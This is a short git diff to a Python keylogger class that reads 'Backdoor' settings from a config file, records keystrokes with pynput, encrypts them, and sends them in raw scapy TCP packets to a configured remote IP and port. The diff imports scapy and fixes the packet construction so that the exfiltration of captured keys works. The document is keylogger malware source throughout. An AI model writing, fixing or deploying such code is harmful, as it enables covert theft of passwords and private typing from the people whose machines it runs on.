@@ -1,6 +1,7 @@
 from pynput import keyboard
 import encryption
 import ConfigParser
+from scapy.all import *
 
 class Keylogger(object):
     def __init__(self):
@@ -11,7 +12,7 @@ class Keylogger(object):
         self.remotePort = int(config.get ('Backdoor', 'remotePort'))
         self.localIP = config.get('Backdoor', 'localIP')
         self.localPort = int(config.get('Backdoor', 'localPort'))
-        self.password = config.get('General', 'password')
+        self.password = config.get('Encryption', 'password')
 
         self.listener = keyboard.Listener(on_press=self.onPress)
 
@@ -38,5 +39,5 @@ class Keylogger(object):
 
     def send(self, keys):
         payload = encryption.encrypt(self.password + keys)
-        packet = IP(dst=self.remoteIP, src=self.localIP)/TCP(dport=self.remotePort, sport=self.localPort)/Raw(payload=payload)
+        packet = IP(dst=self.remoteIP, src=self.localIP)/TCP(dport=self.remotePort, sport=self.localPort)/Raw(load=payload)
         send(packet,verbose=False)
